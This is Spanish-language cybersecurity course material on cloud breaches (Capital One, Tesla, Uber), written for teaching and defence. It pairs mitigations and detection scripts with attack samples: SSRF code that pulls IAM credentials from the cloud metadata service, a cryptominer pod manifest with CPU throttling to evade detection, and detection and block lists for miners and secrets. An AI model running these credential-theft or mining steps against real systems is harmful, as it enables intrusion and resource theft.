# CASOS PRÁCTICOS AVANZADOS
## Clase 7 - Seguridad en la Nube y Virtualización

---

## ÍNDICE

1. [Caso 1: Capital One Data Breach (2019)](#caso-1-capital-one-data-breach-2019)
2. [Caso 2: Tesla Cloud Cryptojacking](#caso-2-tesla-cloud-cryptojacking)
3. [Caso 3: Uber Data Breach (2016)](#caso-3-uber-data-breach-2016)
4. [Caso 4: Docker Hub Database Leak](#caso-4-docker-hub-database-leak)
5. [Caso 5: SolarWinds Supply Chain Attack](#caso-5-solarwinds-supply-chain-attack)
6. [Ejercicios de Análisis](#ejercicios-de-análisis)

---

## CASO 1: CAPITAL ONE DATA BREACH (2019)

### Contexto
En julio de 2019, Capital One descubrió que un atacante había accedido a datos personales de aproximadamente 100 millones de clientes en Estados Unidos y 6 millones en Canadá.

### Cronología del Ataque

**Marzo 2019:**
- Atacante escanea rangos de IP de AWS buscando configuraciones erróneas
- Identifica un firewall de aplicación web (WAF) mal configurado

**22-23 de Marzo 2019:**
- Atacante explota Server-Side Request Forgery (SSRF) en el WAF
- Accede a credenciales IAM con permisos excesivos
- Usa credenciales para acceder a buckets S3

**Marzo-Julio 2019:**
- Atacante exfiltra datos durante meses
- Publica algunos datos en GitHub
- Presume del ataque en Slack y Twitter

**19 de Julio 2019:**
- Capital One es notificado por un investigador de seguridad
- Inicia investigación interna

**29 de Julio 2019:**
- Capital One hace pública la brecha

### Análisis Técnico

#### Vulnerabilidad Explotada: SSRF

```python
# Ejemplo simplificado de la vulnerabilidad SSRF
# El WAF permitía requests a metadata service

import requests

# URL del metadata service de AWS EC2
metadata_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# El atacante pudo hacer requests desde el servidor vulnerable
response = requests.get(metadata_url)
role_name = response.text

# Obtener credenciales temporales del rol IAM
credentials_url = f"{metadata_url}{role_name}"
response = requests.get(credentials_url)

# Las credenciales obtenidas tenían permisos excesivos
credentials = response.json()
print(credentials['AccessKeyId'])
print(credentials['SecretAccessKey'])
print(credentials['Token'])
```

#### Configuración IAM Vulnerable

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:ListBucket",
        "s3:GetBucketLocation"
      ],
      "Resource": [
        "arn:aws:s3:::capital-one-*",
        "arn:aws:s3:::capital-one-*/*"
      ]
    }
  ]
}
```

**Problema:** El rol tenía acceso a TODOS los buckets que comenzaran con "capital-one-", sin restricciones adicionales.

#### Configuración Correcta

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:GetObject"
      ],
      "Resource": [
        "arn:aws:s3:::capital-one-app-specific-bucket/app-folder/*"
      ],
      "Condition": {
        "StringEquals": {
          "s3:ExistingObjectTag/Environment": "production",
          "aws:SourceVpc": "vpc-xxx"
        },
        "IpAddress": {
          "aws:SourceIp": ["10.0.0.0/8"]
        }
      }
    }
  ]
}
```

### Lecciones Aprendidas

#### 1. Principio de Mínimo Privilegio

**Malo:**
```python
# Rol con permisos amplios
policy = {
    "Action": "s3:*",
    "Resource": "*"
}
```

**Bueno:**
```python
# Rol con permisos específicos
policy = {
    "Action": ["s3:GetObject"],
    "Resource": "arn:aws:s3:::specific-bucket/specific-prefix/*",
    "Condition": {
        "IpAddress": {
            "aws:SourceIp": ["192.0.2.0/24"]
        }
    }
}
```

#### 2. Protección del Metadata Service

**Configuración recomendada en EC2:**
```bash
# Requerir IMDSv2 (metadata service v2 con autenticación por token)
aws ec2 modify-instance-metadata-options \
    --instance-id i-1234567890abcdef0 \
    --http-tokens required \
    --http-put-response-hop-limit 1
```

**Ejemplo de acceso seguro:**
```bash
# IMDSv2 requiere primero obtener un token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Luego usar el token para acceder a metadata
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/
```

#### 3. Monitoreo y Detección

**CloudTrail Events a monitorear:**
```json
{
  "eventName": "GetObject",
  "eventSource": "s3.amazonaws.com",
  "userAgent": "aws-cli/1.x",
  "sourceIPAddress": "203.0.113.x",
  "requestParameters": {
    "bucketName": "capital-one-sensitive"
  }
}
```

**Alarma de CloudWatch:**
```json
{
  "AlarmName": "UnusualS3Access",
  "MetricName": "GetObjectCount",
  "Threshold": 1000,
  "EvaluationPeriods": 1,
  "ComparisonOperator": "GreaterThanThreshold"
}
```

### Impacto

- **Datos comprometidos:** 140 millones de registros
- **Tipos de datos:**
  - Nombres
  - Direcciones
  - Números de teléfono
  - Fechas de nacimiento
  - ~140,000 números de seguro social
  - ~80,000 números de cuenta bancaria
- **Multa:** $80 millones USD
- **Costos totales:** >$300 millones USD

### Ejercicio Práctico: Simular y Prevenir

#### Paso 1: Crear Entorno Vulnerable (LocalStack)

```bash
# Crear instancia EC2 simulada con metadata service
aws --endpoint-url=http://localhost:4566 ec2 run-instances \
    --image-id ami-12345 \
    --instance-type t2.micro \
    --iam-instance-profile Name=OverprivilegedRole

# Crear rol con permisos excesivos
aws --endpoint-url=http://localhost:4566 iam create-role \
    --role-name OverprivilegedRole \
    --assume-role-policy-document file://trust-policy.json

# Adjuntar política permisiva
aws --endpoint-url=http://localhost:4566 iam attach-role-policy \
    --role-name OverprivilegedRole \
    --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess
```

#### Paso 2: Simular Ataque SSRF

```python
#!/usr/bin/env python3
"""
Simulación de ataque SSRF para fines educativos
SOLO USAR EN ENTORNOS DE LABORATORIO
"""

import requests
import json

def simulate_ssrf_attack(vulnerable_endpoint):
    """
    Simula un ataque SSRF contra un endpoint vulnerable
    """
    # URL del metadata service
    metadata_base = "http://169.254.169.254/latest/meta-data/"

    # Intentar obtener nombre del rol IAM
    payload = {
        "url": f"{metadata_base}iam/security-credentials/"
    }

    response = requests.post(vulnerable_endpoint, json=payload)

    if response.status_code == 200:
        role_name = response.text.strip()
        print(f"[!] Rol IAM encontrado: {role_name}")

        # Obtener credenciales
        payload = {
            "url": f"{metadata_base}iam/security-credentials/{role_name}"
        }

        response = requests.post(vulnerable_endpoint, json=payload)
        credentials = response.json()

        print(f"[!] Credenciales obtenidas:")
        print(f"    AccessKeyId: {credentials['AccessKeyId']}")
        print(f"    SecretAccessKey: {credentials['SecretAccessKey'][:20]}...")
        print(f"    Token: {credentials['Token'][:50]}...")

        return credentials

    return None

# SOLO PARA EDUCACIÓN - NO USAR EN SISTEMAS REALES
if __name__ == '__main__':
    print("[!] ADVERTENCIA: Solo para uso educativo en laboratorio")
    # simulate_ssrf_attack("http://localhost:8080/proxy")
```

#### Paso 3: Implementar Mitigaciones

**Código para prevenir SSRF:**
```python
#!/usr/bin/env python3
"""
Implementación de protección contra SSRF
"""

import ipaddress
import urllib.parse

BLOCKED_IPS = [
    ipaddress.ip_network('169.254.169.254/32'),  # AWS metadata
    ipaddress.ip_network('127.0.0.0/8'),         # Localhost
    ipaddress.ip_network('10.0.0.0/8'),          # Private
    ipaddress.ip_network('172.16.0.0/12'),       # Private
    ipaddress.ip_network('192.168.0.0/16'),      # Private
]

def is_safe_url(url):
    """
    Verifica si una URL es segura para hacer requests
    """
    try:
        parsed = urllib.parse.urlparse(url)

        # Verificar esquema
        if parsed.scheme not in ['http', 'https']:
            return False, "Esquema no permitido"

        # Resolver hostname a IP
        import socket
        ip = socket.gethostbyname(parsed.hostname)
        ip_obj = ipaddress.ip_address(ip)

        # Verificar contra lista de IPs bloqueadas
        for blocked_network in BLOCKED_IPS:
            if ip_obj in blocked_network:
                return False, f"IP bloqueada: {ip}"

        return True, "URL segura"

    except Exception as e:
        return False, f"Error al validar URL: {str(e)}"

# Ejemplo de uso
test_urls = [
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost:8080/",
    "http://example.com/",
    "http://10.0.0.1/"
]

for url in test_urls:
    safe, message = is_safe_url(url)
    print(f"{'✓' if safe else '✗'} {url}: {message}")
```

---

## CASO 2: TESLA CLOUD CRYPTOJACKING

### Contexto
En febrero de 2018, investigadores de RedLock descubrieron que hackers habían comprometido la infraestructura cloud de Tesla en AWS para minar criptomonedas.

### Vector de Ataque

#### 1. Consola Kubernetes sin Autenticación

```bash
# Los atacantes encontraron una consola Kubernetes expuesta
# Sin autenticación requerida

kubectl get pods --all-namespaces
# Acceso completo sin credenciales
```

#### 2. Escalada a AWS

```python
# Desde los pods de Kubernetes, accedieron a credenciales AWS
import boto3
import requests

# Metadata service accesible desde pods
metadata_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
role = requests.get(metadata_url).text
credentials = requests.get(f"{metadata_url}{role}").json()

# Usar credenciales para acceder a S3
s3 = boto3.client(
    's3',
    aws_access_key_id=credentials['AccessKeyId'],
    aws_secret_access_key=credentials['SecretAccessKey'],
    aws_session_token=credentials['Token']
)

# Encontrar datos sensibles
buckets = s3.list_buckets()
```

#### 3. Despliegue de Mineros

```yaml
# Pod malicioso desplegado en el cluster
apiVersion: v1
kind: Pod
metadata:
  name: crypto-miner
spec:
  containers:
  - name: miner
    image: xmrig/xmrig:latest
    resources:
      limits:
        cpu: "4"
        memory: "8Gi"
    command:
      - "./xmrig"
      - "-o"
      - "mining-pool.com:3333"
      - "-u"
      - "attacker-wallet"
```

### Técnicas de Ocultamiento

#### 1. Mining Pool con CloudFlare

```python
# Los atacantes usaron CloudFlare para ocultar el mining pool
# Dificultando la detección por IP

MINING_POOL = "mining.cloudflare-proxy.com"
# En realidad apuntaba a un pool de minería
```

#### 2. Throttling de CPU

```yaml
# Limitar uso de CPU para evitar alertas
resources:
  requests:
    cpu: "100m"  # Bajo para evitar detección
  limits:
    cpu: "500m"  # No exceder 50% de un core
```

### Detección y Prevención

#### Script de Detección de Cryptojacking

```python
#!/usr/bin/env python3
"""
Detecta actividad sospechosa de cryptojacking en AWS
"""

import boto3
import re

def check_ec2_cryptojacking():
    """
    Analiza instancias EC2 buscando indicadores de cryptojacking
    """
    ec2 = boto3.client('ec2')
    cloudwatch = boto3.client('cloudwatch')

    findings = []

    # Obtener todas las instancias
    instances = ec2.describe_instances()

    for reservation in instances['Reservations']:
        for instance in reservation['Instances']:
            instance_id = instance['InstanceId']

            # Verificar uso de CPU alto sostenido
            cpu_metrics = cloudwatch.get_metric_statistics(
                Namespace='AWS/EC2',
                MetricName='CPUUtilization',
                Dimensions=[
                    {'Name': 'InstanceId', 'Value': instance_id}
                ],
                StartTime=datetime.now() - timedelta(hours=24),
                EndTime=datetime.now(),
                Period=3600,
                Statistics=['Average']
            )

            high_cpu_periods = [
                m for m in cpu_metrics['Datapoints']
                if m['Average'] > 80
            ]

            if len(high_cpu_periods) > 20:  # CPU alta por >20 horas
                findings.append({
                    'instance_id': instance_id,
                    'issue': 'CPU alta sostenida',
                    'severity': 'HIGH',
                    'details': f'{len(high_cpu_periods)} horas con CPU >80%'
                })

            # Verificar conexiones de red sospechosas
            # (requiere VPC Flow Logs habilitados)

    return findings

def check_kubernetes_cryptojacking():
    """
    Verifica cluster Kubernetes por actividad de minería
    """
    from kubernetes import client, config

    config.load_kube_config()
    v1 = client.CoreV1Api()

    findings = []

    # Listar todos los pods
    pods = v1.list_pod_for_all_namespaces()

    # Patrones sospechosos en nombres de contenedores/imágenes
    suspicious_patterns = [
        r'xmrig',
        r'cpuminer',
        r'cgminer',
        r'ethminer',
        r'claymore',
        r'phoenix',
        r'nbminer'
    ]

    for pod in pods.items:
        for container in pod.spec.containers:
            for pattern in suspicious_patterns:
                if re.search(pattern, container.image, re.IGNORECASE):
                    findings.append({
                        'pod': pod.metadata.name,
                        'namespace': pod.metadata.namespace,
                        'container_image': container.image,
                        'issue': 'Imagen sospechosa de cryptomining',
                        'severity': 'CRITICAL'
                    })

    return findings

if __name__ == '__main__':
    print("[*] Analizando EC2 instances...")
    ec2_findings = check_ec2_cryptojacking()

    print("[*] Analizando Kubernetes cluster...")
    k8s_findings = check_kubernetes_cryptojacking()

    all_findings = ec2_findings + k8s_findings

    if all_findings:
        print(f"\n[!] Se encontraron {len(all_findings)} hallazgos:")
        for finding in all_findings:
            print(f"\n[{finding['severity']}] {finding['issue']}")
            for key, value in finding.items():
                if key not in ['issue', 'severity']:
                    print(f"  {key}: {value}")
    else:
        print("\n[+] No se encontraron indicadores de cryptojacking")
```

#### Configuración de Alertas

**CloudWatch Alarm para CPU Alta:**
```json
{
  "AlarmName": "HighCPUUtilization",
  "ComparisonOperator": "GreaterThanThreshold",
  "EvaluationPeriods": 2,
  "MetricName": "CPUUtilization",
  "Namespace": "AWS/EC2",
  "Period": 300,
  "Statistic": "Average",
  "Threshold": 80.0,
  "ActionsEnabled": true,
  "AlarmActions": [
    "arn:aws:sns:us-east-1:123456789012:SecurityAlerts"
  ],
  "AlarmDescription": "Alerta cuando CPU excede 80% por 10 minutos"
}
```

### Mitigaciones Implementadas

#### 1. Autenticación en Kubernetes

```yaml
# kube-apiserver configuration
apiVersion: v1
kind: Config
users:
- name: admin
  user:
    client-certificate: /path/to/cert
    client-key: /path/to/key

clusters:
- name: secure-cluster
  cluster:
    certificate-authority: /path/to/ca.crt
    server: https://k8s.example.com:6443

contexts:
- name: secure-context
  context:
    cluster: secure-cluster
    user: admin
    namespace: default
```

#### 2. Network Policies

```yaml
# Bloquear tráfico saliente no autorizado
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-external
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - to:
    - namespaceSelector: {}
    ports:
    - protocol: TCP
      port: 443
  # No permite conexiones a mining pools externos
```

#### 3. Pod Security Standards

```yaml
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: restricted
spec:
  privileged: false
  allowPrivilegeEscalation: false
  requiredDropCapabilities:
    - ALL
  volumes:
    - 'configMap'
    - 'emptyDir'
    - 'projected'
    - 'secret'
    - 'downwardAPI'
  hostNetwork: false
  hostIPC: false
  hostPID: false
  runAsUser:
    rule: 'MustRunAsNonRoot'
  seLinux:
    rule: 'RunAsAny'
  fsGroup:
    rule: 'RunAsAny'
```

---

## CASO 3: UBER DATA BREACH (2016)

### Contexto
En octubre de 2016, hackers accedieron a datos de 57 millones de usuarios y conductores de Uber. La compañía ocultó la brecha durante un año, pagando $100,000 a los atacantes para que destruyeran los datos.

### Cronología del Ataque

**Octubre 2016:**
- Atacantes acceden a cuenta de GitHub privada de Uber
- Encuentran credenciales AWS hardcodeadas en repositorios

**Vector de Ataque:**

```python
# Código vulnerable encontrado en GitHub (ejemplo simplificado)
import boto3

# ❌ NUNCA HACER ESTO - Credenciales hardcodeadas
AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"
AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

s3 = boto3.client(
    's3',
    aws_access_key_id=AWS_ACCESS_KEY,
    aws_secret_access_key=AWS_SECRET_KEY
)

# Las credenciales tenían acceso a S3 con datos de usuarios
```

### Análisis Técnico

#### Problema 1: Credenciales en Código

**Código vulnerable:**
```javascript
// config.js - VULNERABLE
module.exports = {
  aws: {
    accessKeyId: 'AKIAIOSFODNN7EXAMPLE',
    secretAccessKey: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
    region: 'us-west-2'
  },
  database: {
    host: 'prod-db.amazonaws.com',
    password: 'P@ssw0rd123!'
  }
};
```

**Solución correcta:**
```javascript
// config.js - CORRECTO
module.exports = {
  aws: {
    // Usar roles de IAM o variables de entorno
    region: process.env.AWS_REGION || 'us-west-2'
  },
  database: {
    // Usar AWS Secrets Manager
    host: process.env.DB_HOST,
    password: await getSecretFromSecretsManager('db-password')
  }
};

// secrets.js
const AWS = require('aws-sdk');
const secretsManager = new AWS.SecretsManager();

async function getSecretFromSecretsManager(secretName) {
  const data = await secretsManager.getSecretValue({
    SecretId: secretName
  }).promise();

  return JSON.parse(data.SecretString);
}
```

#### Problema 2: Repositorio Privado Comprometido

**Cómo ocurrió:**
1. Ingeniero de Uber usó misma contraseña en múltiples sitios
2. Uno de esos sitios fue comprometido
3. Atacantes probaron credenciales en GitHub
4. Accedieron a repositorios privados

**Script para buscar secretos en repositorios:**

```python
#!/usr/bin/env python3
"""
Escanea repositorios de GitHub buscando secretos expuestos
"""

import re
import os
from github import Github

# Patrones de secretos comunes
PATTERNS = {
    'AWS Access Key': r'AKIA[0-9A-Z]{16}',
    'AWS Secret Key': r'aws_secret_access_key\s*=\s*["\']([^"\']+)["\']',
    'Private Key': r'-----BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY-----',
    'Generic API Key': r'api[_-]?key\s*=\s*["\']([^"\']+)["\']',
    'Generic Secret': r'secret\s*=\s*["\']([^"\']+)["\']',
    'Password': r'password\s*=\s*["\']([^"\']+)["\']',
    'Database URL': r'(postgres|mysql|mongodb)://[^:]+:[^@]+@[^/]+',
}

def scan_repository(repo):
    """
    Escanea un repositorio buscando secretos
    """
    findings = []

    try:
        # Obtener contenido de archivos
        contents = repo.get_contents("")

        while contents:
            file_content = contents.pop(0)

            if file_content.type == "dir":
                contents.extend(repo.get_contents(file_content.path))
            else:
                # Analizar contenido del archivo
                try:
                    content = file_content.decoded_content.decode('utf-8')

                    for secret_type, pattern in PATTERNS.items():
                        matches = re.finditer(pattern, content, re.IGNORECASE)

                        for match in matches:
                            findings.append({
                                'file': file_content.path,
                                'line': content[:match.start()].count('\n') + 1,
                                'type': secret_type,
                                'match': match.group(0)[:50] + '...',
                                'severity': 'CRITICAL'
                            })

                except:
                    pass  # Archivo binario o no decodificable

    except Exception as e:
        print(f"Error escaneando repositorio: {str(e)}")

    return findings

def main():
    # Usar token de GitHub (almacenado de forma segura)
    token = os.getenv('GITHUB_TOKEN')
    g = Github(token)

    # Escanear repositorio
    repo_name = "your-org/your-repo"
    repo = g.get_repo(repo_name)

    print(f"[*] Escaneando repositorio: {repo_name}")
    findings = scan_repository(repo)

    if findings:
        print(f"\n[!] Se encontraron {len(findings)} secretos potenciales:\n")

        for finding in findings:
            print(f"[{finding['severity']}] {finding['type']}")
            print(f"  Archivo: {finding['file']}")
            print(f"  Línea: {finding['line']}")
            print(f"  Match: {finding['match']}")
            print()
    else:
        print("\n[+] No se encontraron secretos expuestos")

if __name__ == '__main__':
    main()
```

### Gestión Correcta de Secretos

#### Opción 1: AWS Secrets Manager

```python
#!/usr/bin/env python3
"""
Uso correcto de AWS Secrets Manager
"""

import boto3
import json
from botocore.exceptions import ClientError

def get_secret(secret_name, region_name="us-west-2"):
    """
    Recupera un secreto de AWS Secrets Manager
    """
    session = boto3.session.Session()
    client = session.client(
        service_name='secretsmanager',
        region_name=region_name
    )

    try:
        response = client.get_secret_value(SecretId=secret_name)

        if 'SecretString' in response:
            return json.loads(response['SecretString'])
        else:
            # Secreto binario
            return base64.b64decode(response['SecretBinary'])

    except ClientError as e:
        if e.response['Error']['Code'] == 'ResourceNotFoundException':
            print(f"El secreto {secret_name} no existe")
        elif e.response['Error']['Code'] == 'InvalidRequestException':
            print(f"Request inválido")
        elif e.response['Error']['Code'] == 'InvalidParameterException':
            print(f"Parámetro inválido")

        raise e

# Uso
db_credentials = get_secret("prod/database/credentials")
print(f"Database host: {db_credentials['host']}")
# NO imprimir contraseña en producción
```

#### Opción 2: Variables de Entorno con Docker Secrets

```yaml
# docker-compose.yml
version: '3.8'

services:
  app:
    image: myapp:latest
    environment:
      - DB_HOST=db.example.com
      - AWS_REGION=us-west-2
    secrets:
      - db_password
      - aws_credentials

secrets:
  db_password:
    external: true
  aws_credentials:
    external: true
```

```bash
# Crear secrets
echo "SuperSecretP@ss" | docker secret create db_password -
echo '{"key":"AKIA...","secret":"wJal..."}' | docker secret create aws_credentials -

# La aplicación lee desde /run/secrets/
cat /run/secrets/db_password
```

#### Opción 3: HashiCorp Vault

```python
#!/usr/bin/env python3
"""
Integración con HashiCorp Vault
"""

import hvac

def get_secret_from_vault(secret_path):
    """
    Recupera secreto de Vault
    """
    # Conectar a Vault
    client = hvac.Client(url='https://vault.example.com:8200')

    # Autenticación con rol de Kubernetes
    with open('/var/run/secrets/kubernetes.io/serviceaccount/token') as f:
        jwt = f.read()

    client.auth_kubernetes(role='myapp-role', jwt=jwt)

    # Leer secreto
    secret = client.secrets.kv.v2.read_secret_version(path=secret_path)

    return secret['data']['data']

# Uso
credentials = get_secret_from_vault('database/prod/credentials')
```

### Prevención de Leaks

#### Pre-commit Hook para Git

```bash
#!/bin/bash
# .git/hooks/pre-commit

# Usar git-secrets o similar
if ! command -v git-secrets &> /dev/null; then
    echo "git-secrets no está instalado"
    echo "Instalar con: brew install git-secrets"
    exit 1
fi

# Escanear cambios por secretos
git secrets --scan

if [ $? -ne 0 ]; then
    echo ""
    echo "❌ Se detectaron posibles secretos en tu commit"
    echo "Por favor, elimina las credenciales antes de commitear"
    exit 1
fi
```

#### GitHub Actions Workflow

```yaml
# .github/workflows/secrets-scan.yml
name: Scan for Secrets

on: [push, pull_request]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
        with:
          fetch-depth: 0

      - name: TruffleHog Scan
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: ${{ github.event.repository.default_branch }}
          head: HEAD

      - name: Fail if secrets found
        if: steps.scan.outputs.found == 'true'
        run: |
          echo "❌ Secretos encontrados en el código"
          exit 1
```

---

## EJERCICIOS DE ANÁLISIS

### Ejercicio 1: Análisis Forense del Caso Capital One

**Objetivo:** Recrear el ataque en un entorno controlado y documentar cada paso.

**Tareas:**
1. Configurar entorno vulnerable con LocalStack
2. Simular ataque SSRF
3. Extraer credenciales IAM
4. Acceder a buckets S3
5. Documentar indicadores de compromiso (IOCs)
6. Implementar todas las mitigaciones

**Entrega:** Informe técnico con timeline del ataque y remediaciones.

### Ejercicio 2: Implementar Sistema de Detección

**Objetivo:** Crear un sistema que detecte cryptojacking en tu cuenta AWS.

**Tareas:**
1. Implementar script de detección de cryptojacking
2. Configurar alertas de CloudWatch
3. Crear dashboard de métricas sospechosas
4. Simular actividad de minería
5. Verificar que el sistema detecta la actividad

**Entrega:** Código + capturas de alertas funcionando.

### Ejercicio 3: Auditoría de Repositorios

**Objetivo:** Escanear tus repositorios por secretos expuestos.

**Tareas:**
1. Instalar herramientas (trufflehog, git-secrets)
2. Escanear repositorios de tu organización
3. Documentar secretos encontrados
4. Implementar pre-commit hooks
5. Migrar secretos a Secrets Manager

**Entrega:** Reporte de auditoría + configuración de hooks.

---

© 2025 – UTN | Laboratorio de Ciberseguridad
